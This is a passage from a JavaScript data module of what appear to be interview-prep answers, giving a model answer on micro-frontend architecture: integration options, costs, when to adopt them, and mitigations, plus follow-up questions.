**Integration options:** a route-level split behind a reverse proxy (simplest and most independent, but full page loads between apps); runtime composition with Module Federation (a shared SPA with a singleton React, but version skew and bundler coupling); iframes (the strongest isolation, the worst UX and a11y); Web Components (framework-agnostic contracts); server or edge composition. Build-time npm packages are modularisation, not independent deployment.

**Benefits:** team autonomy and independent release cadence, a smaller blast radius per deploy, and incremental migration of legacy apps (the strangler fig pattern).

**Costs:** duplicated dependencies and slower loads, runtime integration failures, inconsistent UX without a strong design system, cross-app state and routing complexity, harder end-to-end testing and debugging, and the need for a platform team that owns the shell.

**When I'd recommend them:** several autonomous teams with clear product domains, blocked by one release train, or an incremental migration of a large legacy frontend.

**When not:** one or two teams, performance-critical consumer pages, or when the real problem is code organisation. A monorepo with enforced boundaries and good CI solves that more cheaply.

**Mitigations if we adopt them:** split by route or domain first; share React as a singleton and a common design system; communicate through the URL and custom events, not a shared store; give each remote an error boundary and a load timeout; add contract tests between host and remotes; tag observability by team.`,
      followUps: ['How do you share React between micro-frontends without loading two copies?', 'How should micro-frontends communicate with each other?', 'How would you migrate an AngularJS app to React incrementally?'],
    },
  ],
};

export default day;
